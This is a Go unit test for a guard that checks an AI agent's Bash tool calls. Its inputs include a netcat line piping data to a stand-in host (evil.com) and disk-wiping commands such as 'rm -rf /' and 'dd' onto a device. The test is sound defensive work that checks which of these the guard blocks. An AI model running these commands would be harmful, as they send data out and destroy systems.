package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// v4.1 基线预检后的新月契约：锁定基线（删除/破坏）即使没有拦截器也硬拦
// （基线凌驾于一切 allow 通路——方案 v4.1 §10-F1）；基线之外的动作在无
// 拦截器时照旧放行并留审计。
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no non-baseline command should be blocked, got block for %q", cmd)
		}
	}
	// 锁定基线：无拦截器也必须拦（安全地板，safety pin）。
	for _, cmd := range []string{
		`rm -rf /`,
		`mkfs.ext4 /dev/sda1`,
		`dd if=/dev/zero of=/dev/sda`,
	} {
		if !block(cmd) {
			t.Errorf("baseline destructive command must be blocked even without interceptor: %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse
